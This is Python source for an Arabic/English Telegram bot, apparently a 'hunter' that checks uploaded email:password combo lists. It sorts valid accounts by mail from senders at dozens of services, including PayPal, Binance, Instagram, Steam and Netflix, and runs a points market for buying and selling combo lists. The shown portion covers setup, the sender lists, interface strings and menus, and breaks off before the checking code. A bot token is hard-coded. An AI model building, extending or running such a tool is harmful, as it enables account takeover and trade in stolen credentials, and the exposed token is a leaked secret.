import telebot
import requests
import uuid
import re
import time
import threading
import concurrent.futures
import os
import json
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException
from telebot.types import InputFile
import urllib3
import zipfile
import tempfile
import random
import hashlib
import pycountry
import shutil
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8695510257:AAHINQbRNiEg4ZhAXungEfntvd-Pq2joV-o"
bot = telebot.TeleBot(BOT_TOKEN)

MY_SIGNATURE = "@JF_7F"
TELEGRAM_CHANNEL = "https://t.me/r5d5v"
FORCED_CHANNEL = "@r5d5v"
DEVELOPER_ID = 7502457749

selected_options = {}
check_results = {}
lock = threading.Lock()
write_lock = threading.Lock()
rate_limit_semaphore = threading.Semaphore(100)
combo_list = []
stop_check_flag = {}
turbo_mode = {}
bad_file_attempts = {}
temp_banned_until = {}
pause_check_flag = {}
current_threads = {}

blocked_users = set()
user_language = {}
referral_points = {}
referral_codes = {}

user_purchase_count = {}
user_purchase_weekly = {}
discount_codes = {}
user_daily_bonus = {}
combo_sales_count = {}
user_level = {}
user_gifts = {}
combo_reviews = {}
user_last_points_warning = {}
proxies_list = []
bot_points = 10000
sold_hashes = set()
sold_hashes_file = "sold_hashes.json"

COMBOS_DIR = "UserCombos"
os.makedirs(COMBOS_DIR, exist_ok=True)
os.makedirs("Accounts", exist_ok=True)

check_queue = []
is_checking_global = False
pending_combo_data = {}
combo_lock = threading.Lock()

def safe_load_json(filepath, default_value):
    if os.path.exists(filepath):
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read().strip()
                if not content:
                    return default_value
                return json.loads(content)
        except (json.JSONDecodeError, ValueError, IOError):
            return default_value
    return default_value

def get_combo_list():
    files = []
    for f in os.listdir(COMBOS_DIR):
        if f.endswith('.txt'):
            file_path = os.path.join(COMBOS_DIR, f)
            if os.path.getsize(file_path) > 100:
                files.append(f)
    return files

def load_sold_hashes():
    global sold_hashes
    sold_hashes = set(safe_load_json(sold_hashes_file, []))

def save_sold_hashes():
    with open(sold_hashes_file, "w", encoding="utf-8") as f:
        json.dump(list(sold_hashes), f)

def load_data():
    global blocked_users, selected_options, user_language, referral_points, referral_codes, bad_file_attempts, temp_banned_until
    global user_purchase_count, user_purchase_weekly, discount_codes, user_daily_bonus, combo_sales_count, user_level, user_gifts, combo_reviews, user_last_points_warning, proxies_list, bot_points

    blocked_users = set(safe_load_json("blocked_users.json", []))
    selected_options = safe_load_json("selected_options.json", {})
    user_language = safe_load_json("user_language.json", {})
    referral_points = safe_load_json("user_points.json", {})
    referral_codes = safe_load_json("referral_codes.json", {})
    bad_file_attempts = safe_load_json("bad_file_attempts.json", {})
    temp_banned_until = safe_load_json("temp_banned_until.json", {})
    user_purchase_count = safe_load_json("user_purchase_count.json", {})
    user_purchase_weekly = safe_load_json("user_purchase_weekly.json", {})
    discount_codes = safe_load_json("discount_codes.json", {})
    user_daily_bonus = safe_load_json("user_daily_bonus.json", {})
    combo_sales_count = safe_load_json("combo_sales_count.json", {})
    user_level = safe_load_json("user_level.json", {})
    user_gifts = safe_load_json("user_gifts.json", {})
    combo_reviews = safe_load_json("combo_reviews.json", {})
    user_last_points_warning = safe_load_json("user_last_points_warning.json", {})
    proxies_list = safe_load_json("proxies.json", [])
    bot_points = safe_load_json("bot_points.json", 10000)

def save_data():
    with open("blocked_users.json", "w", encoding="utf-8") as f:
        json.dump(list(blocked_users), f)
    with open("selected_options.json", "w", encoding="utf-8") as f:
        json.dump(selected_options, f)
    with open("user_language.json", "w", encoding="utf-8") as f:
        json.dump(user_language, f)
    with open("user_points.json", "w", encoding="utf-8") as f:
        json.dump(referral_points, f)
    with open("referral_codes.json", "w", encoding="utf-8") as f:
        json.dump(referral_codes, f)
    with open("bad_file_attempts.json", "w", encoding="utf-8") as f:
        json.dump(bad_file_attempts, f)
    with open("temp_banned_until.json", "w", encoding="utf-8") as f:
        json.dump(temp_banned_until, f)
    with open("user_purchase_count.json", "w", encoding="utf-8") as f:
        json.dump(user_purchase_count, f)
    with open("user_purchase_weekly.json", "w", encoding="utf-8") as f:
        json.dump(user_purchase_weekly, f)
    with open("discount_codes.json", "w", encoding="utf-8") as f:
        json.dump(discount_codes, f)
    with open("user_daily_bonus.json", "w", encoding="utf-8") as f:
        json.dump(user_daily_bonus, f)
    with open("combo_sales_count.json", "w", encoding="utf-8") as f:
        json.dump(combo_sales_count, f)
    with open("user_level.json", "w", encoding="utf-8") as f:
        json.dump(user_level, f)
    with open("user_gifts.json", "w", encoding="utf-8") as f:
        json.dump(user_gifts, f)
    with open("combo_reviews.json", "w", encoding="utf-8") as f:
        json.dump(combo_reviews, f)
    with open("user_last_points_warning.json", "w", encoding="utf-8") as f:
        json.dump(user_last_points_warning, f)
    with open("proxies.json", "w", encoding="utf-8") as f:
        json.dump(proxies_list, f)
    with open("bot_points.json", "w", encoding="utf-8") as f:
        json.dump(bot_points, f)

def update_user_level(user_id):
    points = referral_points.get(str(user_id), 0)
    if points < 50:
        level = 1
    elif points < 200:
        level = 2
    else:
        level = 3
    user_level[str(user_id)] = level
    save_data()
    return level

def get_combo_price(user_id):
    points = referral_points.get(str(user_id), 0)
    level = update_user_level(user_id)
    if level == 1:
        price = 20
    elif level == 2:
        price = 18
    else:
        price = 15
    user_id_str = str(user_id)
    if user_id_str in user_purchase_weekly:
        first_purchase = datetime.fromtimestamp(user_purchase_weekly[user_id_str])
        if datetime.now() - first_purchase < timedelta(days=7):
            count = user_purchase_count.get(user_id_str, 0)
            if count >= 3:
                price = min(price, 15)
    return price

def check_low_points_warning(user_id):
    points = referral_points.get(str(user_id), 0)
    last_warning = user_last_points_warning.get(str(user_id), 0)
    if points < 5 and (datetime.now().timestamp() - last_warning) > 86400:
        user_last_points_warning[str(user_id)] = datetime.now().timestamp()
        save_data()
        return True
    return False

services = {
    "Supercell": {"senders": ["noreply@id.supercell.com", "support@supercell.com", "no-reply@supercell.com", "billing@supercell.com"], "file": f"Hits_Supercell_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Ludo": {"senders": ["noreply@gameberrylabs.com", "support@gameberrylabs.com", "billing@gameberrylabs.com", "support@ludoking.com", "noreply@ludoking.com"], "file": f"Hits_Ludo_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "PUBG Mobile": {"senders": ["noreply@pubgmobile.com", "link@pubgmobile.com", "account@pubgmobile.com", "support@pubgmobile.com", "noreply@midasbuy.com", "proxima-billing@tencent.com", "notice@pubgmobile.com"], "file": f"Hits_PUBG_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Twitter": {"senders": ["info@x.com", "noreply@twitter.com", "no-reply@twitter.com", "twitter@twitter.com"], "file": f"Hits_Twitter_by_{MY_SIGNATURE}.txt", "category": "social"},
    "Snapchat": {"senders": ["no-reply@snapchat.com", "support@snapchat.com", "team@snapchat.com", "orders@snapchat.com", "security@snapchat.com"], "file": f"Hits_Snapchat_by_{MY_SIGNATURE}.txt", "category": "social"},
    "Konami": {"senders": ["no-reply@konami.net", "support@konami.net", "noreply@ext.konami.net", "account-noreply@konami.net"], "file": f"Hits_Konami_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Free Fire": {"senders": ["account-security-noreply@garena.com", "noreply@garena.com", "support@garena.com", "no-reply@garena.com"], "file": f"Hits_FreeFire_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Fortnite": {"senders": ["help@acct.epicgames.com", "help@epicgames.com", "noreply@epicgames.com", "accounts@epicgames.com", "support@epicgames.com"], "file": f"Hits_Fortnite_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Facebook": {"senders": ["security@facebookmail.com"], "file": f"Hits_Facebook_by_{MY_SIGNATURE}.txt", "category": "social"},
    "Instagram": {"senders": ["security@mail.instagram.com"], "file": f"Hits_Instagram_by_{MY_SIGNATURE}.txt", "category": "social"},
    "TikTok": {"senders": ["register@account.tiktok.com"], "file": f"Hits_TikTok_by_{MY_SIGNATURE}.txt", "category": "social"},
    "LinkedIn": {"senders": ["security-noreply@linkedin.com"], "file": f"Hits_LinkedIn_by_{MY_SIGNATURE}.txt", "category": "social"},
    "Pinterest": {"senders": ["no-reply@pinterest.com"], "file": f"Hits_Pinterest_by_{MY_SIGNATURE}.txt", "category": "social"},
    "Reddit": {"senders": ["noreply@reddit.com"], "file": f"Hits_Reddit_by_{MY_SIGNATURE}.txt", "category": "social"},
    "VK": {"senders": ["noreply@vk.com"], "file": f"Hits_VK_by_{MY_SIGNATURE}.txt", "category": "social"},
    "WeChat": {"senders": ["no-reply@wechat.com"], "file": f"Hits_WeChat_by_{MY_SIGNATURE}.txt", "category": "social"},
    "WhatsApp": {"senders": ["no-reply@whatsapp.com"], "file": f"Hits_WhatsApp_by_{MY_SIGNATURE}.txt", "category": "messaging"},
    "Telegram": {"senders": ["telegram.org"], "file": f"Hits_Telegram_by_{MY_SIGNATURE}.txt", "category": "messaging"},
    "Discord": {"senders": ["noreply@discord.com"], "file": f"Hits_Discord_by_{MY_SIGNATURE}.txt", "category": "messaging"},
    "Signal": {"senders": ["no-reply@signal.org"], "file": f"Hits_Signal_by_{MY_SIGNATURE}.txt", "category": "messaging"},
    "Line": {"senders": ["no-reply@line.me"], "file": f"Hits_Line_by_{MY_SIGNATURE}.txt", "category": "messaging"},
    "Netflix": {"senders": ["info@account.netflix.com"], "file": f"Hits_Netflix_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Spotify": {"senders": ["no-reply@spotify.com"], "file": f"Hits_Spotify_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Twitch": {"senders": ["no-reply@twitch.tv"], "file": f"Hits_Twitch_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "YouTube": {"senders": ["no-reply@youtube.com"], "file": f"Hits_YouTube_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Disney+": {"senders": ["no-reply@disneyplus.com"], "file": f"Hits_DisneyPlus_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Hulu": {"senders": ["account@hulu.com"], "file": f"Hits_Hulu_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "HBO Max": {"senders": ["no-reply@hbomax.com"], "file": f"Hits_HBOMax_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Amazon Prime": {"senders": ["auto-confirm@amazon.com"], "file": f"Hits_AmazonPrime_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Apple TV+": {"senders": ["no-reply@apple.com"], "file": f"Hits_AppleTV_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Crunchyroll": {"senders": ["noreply@crunchyroll.com"], "file": f"Hits_Crunchyroll_by_{MY_SIGNATURE}.txt", "category": "streaming"},
    "Amazon": {"senders": ["auto-confirm@amazon.com"], "file": f"Hits_Amazon_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "eBay": {"senders": ["newuser@nuwelcome.ebay.com"], "file": f"Hits_eBay_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "Shopify": {"senders": ["no-reply@shopify.com"], "file": f"Hits_Shopify_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "Etsy": {"senders": ["transaction@etsy.com"], "file": f"Hits_Etsy_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "AliExpress": {"senders": ["no-reply@aliexpress.com"], "file": f"Hits_AliExpress_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "Walmart": {"senders": ["no-reply@walmart.com"], "file": f"Hits_Walmart_by_{MY_SIGNATURE}.txt", "category": "shopping"},
    "PayPal": {"senders": ["service@paypal.com.br"], "file": f"Hits_PayPal_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Binance": {"senders": ["do-not-reply@ses.binance.com"], "file": f"Hits_Binance_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Coinbase": {"senders": ["no-reply@coinbase.com"], "file": f"Hits_Coinbase_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Revolut": {"senders": ["no-reply@revolut.com"], "file": f"Hits_Revolut_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Venmo": {"senders": ["no-reply@venmo.com"], "file": f"Hits_Venmo_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Cash App": {"senders": ["no-reply@cash.app"], "file": f"Hits_CashApp_by_{MY_SIGNATURE}.txt", "category": "finance"},
    "Steam": {"senders": ["noreply@steampowered.com"], "file": f"Hits_Steam_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Xbox": {"senders": ["xboxreps@engage.xbox.com"], "file": f"Hits_Xbox_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "PlayStation": {"senders": ["reply@txn-email.playstation.com"], "file": f"Hits_PlayStation_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Epic Games": {"senders": ["help@acct.epicgames.com"], "file": f"Hits_EpicGames_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "EA Sports": {"senders": ["EA@e.ea.com"], "file": f"Hits_EASports_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Ubisoft": {"senders": ["noreply@ubisoft.com"], "file": f"Hits_Ubisoft_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Riot Games": {"senders": ["no-reply@riotgames.com"], "file": f"Hits_RiotGames_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Valorant": {"senders": ["noreply@valorant.com"], "file": f"Hits_Valorant_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Roblox": {"senders": ["accounts@roblox.com"], "file": f"Hits_Roblox_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Minecraft": {"senders": ["noreply@mojang.com"], "file": f"Hits_Minecraft_by_{MY_SIGNATURE}.txt", "category": "gaming"},
    "Google": {"senders": ["no-reply@accounts.google.com"], "file": f"Hits_Google_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "Microsoft": {"senders": ["account-security-noreply@accountprotection.microsoft.com"], "file": f"Hits_Microsoft_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "Apple": {"senders": ["no-reply@apple.com"], "file": f"Hits_Apple_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "GitHub": {"senders": ["noreply@github.com"], "file": f"Hits_GitHub_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "Dropbox": {"senders": ["no-reply@dropbox.com"], "file": f"Hits_Dropbox_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "Zoom": {"senders": ["no-reply@zoom.us"], "file": f"Hits_Zoom_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "Slack": {"senders": ["no-reply@slack.com"], "file": f"Hits_Slack_by_{MY_SIGNATURE}.txt", "category": "tech"},
    "NordVPN": {"senders": ["no-reply@nordvpn.com"], "file": f"Hits_NordVPN_by_{MY_SIGNATURE}.txt", "category": "security"},
    "ExpressVPN": {"senders": ["no-reply@expressvpn.com"], "file": f"Hits_ExpressVPN_by_{MY_SIGNATURE}.txt", "category": "security"},
    "Airbnb": {"senders": ["no-reply@airbnb.com"], "file": f"Hits_Airbnb_by_{MY_SIGNATURE}.txt", "category": "travel"},
    "Uber": {"senders": ["no-reply@uber.com"], "file": f"Hits_Uber_by_{MY_SIGNATURE}.txt", "category": "travel"},
    "Booking.com": {"senders": ["no-reply@booking.com"], "file": f"Hits_Booking_by_{MY_SIGNATURE}.txt", "category": "travel"},
    "Uber Eats": {"senders": ["no-reply@ubereats.com"], "file": f"Hits_UberEats_by_{MY_SIGNATURE}.txt", "category": "food"},
    "DoorDash": {"senders": ["no-reply@doordash.com"], "file": f"Hits_DoorDash_by_{MY_SIGNATURE}.txt", "category": "food"},
    "Anthropic": {"senders": ["noreply@anthropic.com", "support@anthropic.com", "billing@anthropic.com", "notifications@anthropic.com", "privacy@anthropic.com", "info@anthropic.com"], "file": f"Hits_Anthropic_by_{MY_SIGNATURE}.txt", "category": "ai"},
}
additional_services = {
    "Tinder": {"senders": ["no-reply@gotinder.com", "info@gotinder.com"], "file": f"Hits_Tinder_by_{MY_SIGNATURE}.txt", "category": "dating"},
    "OnlyFans": {"senders": ["no-reply@onlyfans.com", "support@onlyfans.com"], "file": f"Hits_OnlyFans_by_{MY_SIGNATURE}.txt", "category": "social"},
    "ChatGPT": {"senders": ["no-reply@openai.com", "support@openai.com"], "file": f"Hits_ChatGPT_by_{MY_SIGNATURE}.txt", "category": "ai"},
    "Canva": {"senders": ["no-reply@canva.com", "support@canva.com"], "file": f"Hits_Canva_by_{MY_SIGNATURE}.txt", "category": "design"},
    "NordPass": {"senders": ["no-reply@nordpass.com", "support@nordpass.com"], "file": f"Hits_NordPass_by_{MY_SIGNATURE}.txt", "category": "security"},
    "Duolingo": {"senders": ["no-reply@duolingo.com", "support@duolingo.com"], "file": f"Hits_Duolingo_by_{MY_SIGNATURE}.txt", "category": "education"},
}
services.update(additional_services)

def get_text(key, user_id):
    lang = user_language.get(user_id, 'ar')
    texts = {
        'welcome_ar': f'''مرحباً بك في بوت صيد حسابات جميع البرامج والألعاب 🎯
البوت مجاني ولا توجد فيه أي أخطاء
مطور البوت: حبش {MY_SIGNATURE}

📌 فقط قم بإرسال ملف (كومبو) ثم اختر الخدمات للفحص''',
        'welcome_en': f'''Welcome to the accounts hunter bot for all programs and games 🎯
The bot is free and has no errors
Bot developer: {MY_SIGNATURE}

📌 Just send a (combo) file then choose the services to check''',
        'file_received_ar': '✅ تم استلام الملف. الرجاء اختيار الخدمات التي تريد فحصها:',
        'file_received_en': '✅ File received. Please select the services you want to check:',
        'start_check_ar': '✅ جارٍ بدء الفحص...',
        'start_check_en': '✅ Starting check...',
        'check_complete_ar': '✅ انتهاء الفحص!',
        'check_complete_en': '✅ Check completed!',
        'no_service_ar': '⚠️ الرجاء اختيار خدمة واحدة على الأقل قبل بدء الفحص!',
        'no_service_en': '⚠️ Please select at least one service before starting the check!',
        'blocked_ar': '🚫 أنت محظور من استخدام هذا البوت.',
        'blocked_en': '🚫 You are banned from using this bot.',
        'account_ar': '✅ حساب صالح (بدون خدمات مرتبطة)',
        'account_en': '✅ Valid account (no linked services)',
        'pending_ar': '⏳ جاري مراجعة طلبك من قبل المطور...',
        'pending_en': '⏳ Your request is being reviewed by the developer...',
        'rejected_ar': '🚫 تم رفض طلبك وحظرك من البوت.',
        'rejected_en': '🚫 Your request has been rejected and you are banned from the bot.',
        'status_ar': '۝ *نتائج الفحص*\n۩ صالح: {good}\n۞ فاسد: {bad}',
        'status_en': '۝ *Check Results*\n۩ Valid: {good}\n۞ Invalid: {bad}',
        'not_subscribed_ar': f'⚠️ يرجى الاشتراك في القناة أولاً لاستخدام البوت:\n{TELEGRAM_CHANNEL}',
        'not_subscribed_en': f'⚠️ Please subscribe to the channel first to use the bot:\n{TELEGRAM_CHANNEL}',
        'subscribed_ar': '✅ تم التحقق من اشتراكك! تم إضافة 10 نقاط كمكافأة.',
        'subscribed_en': '✅ Subscribed! 10 points added as a reward.',
        'combo_bank_ar': '📂 *كومبو بنك*\nنقاطك: {points}\nاختر الكومبو الذي تريد شراءه (السعر حسب مستواك):',
        'combo_bank_en': '📂 *Combo Bank*\nYour points: {points}\nChoose combo to buy (price based on your level):',
        'no_combos_ar': '❌ لا توجد كومبوات حالياً.',
        'no_combos_en': '❌ No combos available.',
        'combo_added_ar': '✅ تم إضافة الكومبو {name} بنجاح!',
        'combo_added_en': '✅ Combo {name} added successfully!',
        'combo_deleted_ar': '✅ تم حذف الكومبو {name} بنجاح!',
        'combo_deleted_en': '✅ Combo {name} deleted successfully!',
        'delete_combo_ar': '🗑 اختر الكومبو لحذفه:',
        'delete_combo_en': '🗑 Choose combo to delete:',
        'stop_check_ar': '⏹️ تم إيقاف الفحص بناءً على طلبك',
        'stop_check_en': '⏹️ Check stopped by your request',
        'referral_info_ar': '🎁 *نظام الإحالات*\nرابطك الخاص: {link}\nنقاطك: {points}\nكل صديق يسجل عبر رابطك يمنحك 10 نقاط والصديق يحصل على 5 نقاط',
        'referral_info_en': '🎁 *Referral System*\nYour link: {link}\nYour points: {points}\nEach friend who joins via your link gives you 10 points and the friend gets 5 points',
        'turbo_on_ar': '🚀 وضع Turbo مفعل (فحص أسرع)',
        'turbo_on_en': '🚀 Turbo mode activated (faster checking)',
        'turbo_off_ar': '🐢 وضع عادي مفعل',
        'turbo_off_en': '🐢 Normal mode activated',
        'premium_account_ar': '⭐ حساب بريميوم (مرتبط بـ {count} خدمات)',
        'premium_account_en': '⭐ Premium account (linked to {count} services)',
        'temp_banned_ar': '🚫 تم حظرك مؤقتاً لمدة ساعة بسبب إرسال ملفات فاسدة مرتين',
        'temp_banned_en': '🚫 You are temporarily banned for one hour due to sending invalid files twice',
        'zip_sent_ar': '📦 تم إرسال النتائج مضغوطة',
        'zip_sent_en': '📦 Results sent as zip archive',
        'buy_prompt_ar': '💰 *شراء كومبو*\nالكومبو: {name}\nالسعر: {price} نقطة\nنقاطك الحالية: {points}\nهل تريد المتابعة؟',
        'buy_prompt_en': '💰 *Buy Combo*\nCombo: {name}\nPrice: {price} points\nYour points: {points}\nProceed?',
        'buy_success_ar': '✅ تم شراء الكومبو بنجاح! تم خصم {price} نقطة.\nنقاطك المتبقية: {points}',
        'buy_success_en': '✅ Combo purchased successfully! {price} points deducted.\nRemaining points: {points}',
        'buy_fail_points_ar': '❌ لا تملك نقاط كافية لشراء هذا الكومبو.\nنقاطك: {points}\nالسعر: {price} نقطة',
        'buy_fail_points_en': '❌ You don\'t have enough points to buy this combo.\nYour points: {points}\nPrice: {price} points',
        'points_ar': '💰 *نقاطك الحالية:* {points}\n📊 *مستواك:* {level}',
        'points_en': '💰 *Your current points:* {points}\n📊 *Your level:* {level}',
        'gift_prompt_ar': '🎁 *إهداء كومبو*\nأدخل معرف المستخدم (ID) الذي تريد إهداء الكومبو له:',
        'gift_prompt_en': '🎁 *Gift Combo*\nEnter the user ID you want to gift this combo to:',
        'gift_success_ar': '🎁 تم إهداء الكومبو {name} إلى المستخدم {target} بنجاح!',
        'gift_success_en': '🎁 Combo {name} gifted to user {target} successfully!',
        'gift_fail_ar': '❌ فشل الإهداء: المستخدم غير موجود أو حدث خطأ.',
        'gift_fail_en': '❌ Gift failed: user not found or error occurred.',
        'review_prompt_ar': '⭐ *تقييم الكومبو*\nقم بتقييم الكومبو {name} من 1 إلى 5 نجوم:\n(أرسل رقماً من 1 إلى 5)',
        'review_prompt_en': '⭐ *Rate Combo*\nRate the combo {name} from 1 to 5 stars:\n(send a number 1-5)',
        'review_comment_ar': '✍️ يمكنك إضافة تعليق اختياري (أو أرسل "تخطي"):',
        'review_comment_en': '✍️ You can add an optional comment (or send "skip"):',
        'review_success_ar': '✅ تم حفظ تقييمك للكومبو {name} بنجاح!',
        'review_success_en': '✅ Your rating for combo {name} has been saved!',
        'daily_bonus_ar': '🎁 *المكافأة اليومية*\nحصلت على نقطتين مجاناً!\nنقاطك الآن: {points}',
        'daily_bonus_en': '🎁 *Daily Bonus*\nYou got 2 free points!\nYour points now: {points}',
        'daily_bonus_already_ar': '⚠️ لقد حصلت على المكافأة اليومية مسبقاً. عاود غداً.',
        'daily_bonus_already_en': '⚠️ You already claimed daily bonus. Come back tomorrow.',
        'low_points_warning_ar': '⚠️ تنبيه: نقاطك أقل من 5 نقاط. قم بدعوة أصدقائك عبر رابط الإحالة لكسب نقاط إضافية!',
        'low_points_warning_en': '⚠️ Warning: Your points are less than 5. Invite friends via referral link to earn more points!',
        'discount_code_ar': '🎟️ *كود الخصم*\nأرسل الكود للحصول على خصم على الكومبو:',
        'discount_code_en': '🎟️ *Discount Code*\nSend the code to get discount on combo:',
        'discount_code_valid_ar': '✅ كود صالح! خصم {percent}% على هذا الكومبو. السعر الجديد: {new_price} نقطة',
        'discount_code_valid_en': '✅ Valid code! {percent}% discount on this combo. New price: {new_price} points',
        'discount_code_invalid_ar': '❌ كود خصم غير صالح.',
        'discount_code_invalid_en': '❌ Invalid discount code.',
        'most_sold_ar': '🏆 *الكومبوات الأكثر مبيعاً*\n{list}',
        'most_sold_en': '🏆 *Best Selling Combos*\n{list}',
        'free_combo_ar': '🎁 *كومبو مجاني*\nلقد حققت 5 إحالات! يمكنك الحصول على كومبو مجاني. اختر الكومبو الذي تريد:',
        'free_combo_en': '🎁 *Free Combo*\nYou have achieved 5 referrals! You can get a free combo. Choose the combo you want:',
        'level_up_ar': '🎉 *ترقية مستوى!*\nوصلت إلى المستوى {level} وستحصل على أسعار مخفضة للكومبوات.',
        'level_up_en': '🎉 *Level Up!*\nYou reached level {level} and will get discounted combo prices.',
        'sell_combo_ar': '💰 *بيع كومبو*\nأرسل ملف الكومبو (txt) لبيعه إلى البوت. سيتم فحصه للتأكد من وجود 100 حساب صالح على الأقل (Hotmail فقط).',
        'sell_combo_en': '💰 *Sell Combo*\nSend the combo file (txt) to sell to the bot. It will be checked to ensure at least 100 valid Hotmail accounts.',
        'sell_price_ar': '💰 حدد سعر البيع (نقاط) بين 10 و 100:',
        'sell_price_en': '💰 Set selling price (points) between 10 and 100:',
        'sell_success_ar': '✅ تم شراء الكومبو {name} بنجاح! حصلت على {price} نقطة.',
        'sell_success_en': '✅ Combo {name} purchased successfully! You got {price} points.',
        'sell_fail_ar': '❌ الكومبو لا يحتوي على 100 حساب صالح من نوع Hotmail. عدد الصالح: {valid}',
        'sell_fail_en': '❌ Combo does not contain 100 valid Hotmail accounts. Valid count: {valid}',
        'bot_points_low_ar': '❌ رصيد البوت من النقاط منخفض، لا يمكن الشراء حالياً.',
        'bot_points_low_en': '❌ Bot points balance is low, cannot buy now.',
        'auto_stop_timeout_ar': '⚠️ تم إيقاف الفحص تلقائياً لتجاوز الوقت المسموح (10 دقائق).',
        'auto_stop_timeout_en': '⚠️ Check stopped automatically due to exceeding time limit (10 minutes).',
        'auto_stall_ar': '⚠️ تم إيقاف الفحص تلقائياً لعدم وجود تقدم لمدة دقيقتين.',
        'auto_stall_en': '⚠️ Check stopped automatically due to no progress for 2 minutes.',
        'heartbeat_ar': '🔄 البوت لا يزال يعمل... جاري الفحص.',
        'heartbeat_en': '🔄 Bot is still working... Checking in progress.',
    }
    return texts.get(f'{key}_{lang}', texts.get(f'{key}_ar', key))

def is_subscribed(user_id):
    try:
        member = bot.get_chat_member(FORCED_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"is_subscribed error: {e}")
        return False

def create_language_buttons():
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("العربية 🇮🇶", callback_data="lang_ar", style='primary'), telebot.types.InlineKeyboardButton("English 🇬🇧", callback_data="lang_en", style='primary'))
    return markup

def create_option_buttons(chat_id):
    lang = user_language.get(chat_id, 'ar')
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    option_list = list(services.keys())
    color_cycle = ['primary', 'success', 'danger']
    for idx, service_name in enumerate(option_list):
        color = color_cycle[idx % len(color_cycle)]
        if service_name in selected_options.get(chat_id, []):
            button_text = f'✅ {service_name}'
        else:
            button_text = service_name
        markup.add(telebot.types.InlineKeyboardButton(button_text, callback_data=f'option_{service_name}', style=color))
    select_all_text = "✅ اختر الكل" if lang == 'ar' else "✅ Select All"
    deselect_all_text = "❌ إلغاء الكل" if lang == 'ar' else "❌ Deselect All"
    turbo_text = "🚀 Turbo Mode" if lang == 'ar' else "🚀 Turbo Mode"
    if turbo_mode.get(chat_id, False):
        turbo_text = "✅ " + turbo_text
    start_text = "✅ بدء الفحص" if lang == 'ar' else "✅ Start Check"
    markup.add(telebot.types.InlineKeyboardButton(select_all_text, callback_data='select_all', style='primary'), telebot.types.InlineKeyboardButton(deselect_all_text, callback_data='deselect_all', style='danger'))
    markup.add(telebot.types.InlineKeyboardButton(turbo_text, callback_data='toggle_turbo', style='primary'))
    markup.add(telebot.types.InlineKeyboardButton(start_text, callback_data='start_check', style='success'))
    return markup

def create_combo_bank_buttons(chat_id):
    lang = user_language.get(chat_id, 'ar')
    markup = telebot.types.InlineKeyboardMarkup(row_width=3)
    combos = get_combo_list()
    for combo in combos:
        price = get_combo_price(chat_id)
        markup.add(telebot.types.InlineKeyboardButton(f"📁 {combo} ({price} نقطة)", callback_data=f"buy_combo_{combo}", style='primary'))
    back_text = "🔙 رجوع" if lang == 'ar' else "🔙 Back"
    markup.add(telebot.types.InlineKeyboardButton(back_text, callback_data='main_menu', style='primary'))
    return markup

def create_most_sold_buttons(chat_id):
    lang = user_language.get(chat_id, 'ar')
    markup = telebot.types.InlineKeyboardMarkup(row_width=3)
    sorted_combos = sorted(combo_sales_count.items(), key=lambda x: x[1], reverse=True)[:5]
    for combo_name, count in sorted_combos:
        markup.add(telebot.types.InlineKeyboardButton(f"🏆 {combo_name} - {count} مبيعات", callback_data=f"buy_combo_{combo_name}", style='primary'))
    back_text = "🔙 رجوع" if lang == 'ar' else "🔙 Back"
    markup.add(telebot.types.InlineKeyboardButton(back_text, callback_data='combo_bank', style='primary'))
    return markup

def create_delete_combo_buttons(chat_id):
    lang = user_language.get(chat_id, 'ar')
    markup = telebot.types.InlineKeyboardMarkup(row_width=3)
    combos = get_combo_list()
    for combo in combos:
        markup.add(telebot.types.InlineKeyboardButton(f"🗑 {combo}", callback_data=f"delete_combo_{combo}", style='danger'))
    back_text = "🔙 رجوع" if lang == 'ar' else "🔙 Back"
    markup.add(telebot.types.InlineKeyboardButton(back_text, callback_data='admin_panel', style='primary'))
    return markup

def update_status_message(chat_id, add_stop_button=False, control_buttons=False):
    good_count = check_results[chat_id]['good']
    bad_count = check_results[chat_id]['bad']
    message = get_text('status', chat_id).format(good=good_count, bad=bad_count)
    if control_buttons and not stop_check_flag.get(chat_id, False):
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
